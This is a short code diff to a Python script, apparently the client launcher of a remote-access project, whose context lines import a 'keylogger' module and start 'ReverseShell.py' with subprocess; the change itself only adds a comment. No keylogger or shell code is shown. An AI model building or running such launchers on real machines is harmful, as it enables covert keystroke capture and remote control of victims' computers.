@@ -2,6 +2,7 @@ import subprocess
 import logfile
 import keylogger
 from threading import Thread
+## main client side initiates all required processes
 
 if __name__ == "__main__":
     subprocess.Popen(["python3","ReverseShell.py"])
